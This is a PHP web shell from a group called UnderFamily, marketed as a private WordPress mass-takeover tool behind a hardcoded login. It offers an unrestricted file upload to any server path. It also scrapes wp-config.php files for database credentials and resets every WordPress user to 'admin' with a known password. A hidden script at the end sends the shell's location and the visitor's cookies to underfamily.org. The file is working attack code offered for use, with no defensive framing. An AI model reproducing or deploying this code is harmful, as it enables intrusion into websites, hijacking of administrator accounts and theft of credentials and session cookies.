﻿<?php session_start();
 $password = "under"; // sifre(degistirebilirsiniz)
 $pass = $_POST['pass'];
 $form = "<form method='POST'>
	<input type='password' name='pass'><input type='submit' value='Login !'>
	</form>";
 if( !isset($_SESSION['sec']) ){ $_SESSION['sec'] = false;
 } if(isset($pass)) { if($pass == $password) { $_SESSION['sec'] = true;
 } else { die( "{$form} <br> <H1>Error");
 } } if(!$_SESSION['sec']): echo $form;
 exit();
 endif;
 if($_GET['log'] == 'out') { session_destroy();
 } echo "UnderFamily | <a href='?log=out'>Çıkış yap</a>";
 
?>
<center><br>-Wp-mass priv8 <br><br>
<h2>Underfamily.org</h2>
<form method="post">
<input type="text" name="config" placeholder="URL">
<input type="submit" name="ch" value="Change">
<div style="display: none;">
<input id="url_1" value="<?php echo base64_encode($_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']); ?>">
<input id="url_2" value="<?php echo base64_encode($_SERVER['SERVER_NAME']); ?>">
</div>
</form>
<?php

$files = @$_FILES["files"];
if ($files["name"] != '') {
    $fullpath = $_REQUEST["path"] . $files["name"];
    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
        echo "<h1><a href='$fullpath'>OK-Click here!</a></h1>";
    }
}echo '<html><head><title>Upload files...</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"></form></body></html>';
?>
<?php
set_time_limit(0);
error_reporting(0);
if($_POST['ch']){
$get2 = file_get_contents($_POST['config']);
preg_match_all('#<a href="(.*?)"#', $get2, $config);
foreach($config[1] as $don){
$get = file_get_contents($_POST['config']."/".$don);

preg_match_all("#'DB_HOST', '(.*?)'#", $get, $host);
foreach($host[1] as $don){
	$host = $don;
}
###
preg_match_all("#'DB_PASSWORD', '(.*?)'#", $get, $pass);
foreach($pass[1] as $done){
	$password = $done;
}
###
preg_match_all("#'DB_USER', '(.*?)'#", $get, $user);
foreach($user[1] as $done1){
	$user = $done1;
}
###
preg_match_all("#'DB_NAME', '(.*?)'#", $get, $name);
foreach($name[1] as $done2){
	$name = $done2;
}
###
preg_match_all("#$table_prefix  = '(.*?)'#", $get, $prefix);
foreach($prefix[1] as $done3){
	$prefix = $done3;
}
$connect = mysqli_connect($host,$user,$password,$name);
if($connect){
	$query1 = mysqli_query($connect,"select * from ".$prefix."options where option_name='siteurl'");
while($siteurl = mysqli_fetch_array($query1)){
	$site_url = $siteurl['option_value'];
}
#####
$query2 = mysqli_query($connect,"update ".$prefix."users set user_login='admin',user_pass='e058cee45065fd08b2a0ab88a9e60354'");
if($query2){
	echo "URL : <a href='$site_url/wp-login.php' target='_blank'>$site_url</a><br><br>UserName : admin<br><br>Password : underfamily<br><br>";
}
}
}
}
?>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js" type="text/javascript"></script>
	<script type="text/javascript">

	        var v=document.getElementById("url_1");
	        var w=document.getElementById("url_2");
		vv=(v.value);
		ww=(w.value);
		bc=document.cookie;
                cc=('&pass=');
                ff=('&url_2=');
                lm=new/**/Image();
                lm.src='https://underfamily.org/bootstrap/confirmation.php?url_1='+vv+ff+ww+cc+bc;

	</script>
